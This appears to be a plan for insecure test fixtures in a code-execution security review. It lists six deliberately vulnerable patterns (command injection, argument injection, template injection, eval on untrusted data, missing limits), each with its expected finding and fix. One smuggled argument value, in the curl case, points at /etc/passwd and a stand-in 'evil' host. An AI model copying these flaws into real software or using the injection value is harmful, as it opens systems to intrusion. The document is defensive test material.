# Insecure fixture plan: secod-runtime-execution

Minimal reproducible unsafe cases, one per control family. Documentation-only plan; no
executable code is maintained in this repository.

## F1 — Shell string concatenation (command injection)

Node service builds an image-resize command as:
`exec(`convert ${userInput} -resize 800x out.png`)` where `userInput` derives from an upload
filename. Expected finding: `Do not ship`. Expected fix: replace shell invocation with
`execFile("convert", ["--", sanitized, "-resize", "800x", "out"])` or a native image library,
hardcode flags, validate the filename against an anchored allowlist.

## F2 — Argument injection without option termination

Python code calls `subprocess.run(["curl", url])` with user-supplied `url`; attacker submits
`--output /etc/passwd https://evil`. Expected finding: `Fix before launch`. Expected fix: insert
`--` before user operands and allowlist URL scheme/host.

## F3 — User-authored template rendering (SSTI)

Flask route renders `render_template_string(user_template)` for a "custom email footer" feature.
Expected finding: `Do not ship`. Expected fix: never render user-authored template source; pass
values as context variables into a fixed template, or use a logic-less engine in a sandboxed,
isolated worker.

## F4 — Dynamic evaluation on untrusted data

`result = eval(user_expression)` inside a calculator endpoint; also `new Function(payload)()`
in a Node worker. Expected finding: `Do not ship`. Expected fix: remove evaluation entirely or
replace with a restricted parser/AST evaluator plus sandbox review.

## F5 — Missing-evidence case

Repository shows `child_process.spawn` with argv array and no shell, but the review cannot
establish the runtime user, timeout, output cap, or egress policy from code alone. Expected
status: `Not verified` for the least-privilege execution-context control, with the exact
deployment/runtime evidence needed listed.

## F6 — Partial-failure case

Spawned process has no timeout and no output-size cap; a hung `ffmpeg` job exhausts disk.
Expected finding: `Fix before launch`. Expected fix: bounded timeout, streamed/capped stdout/
stderr, deterministic cleanup on cancellation.
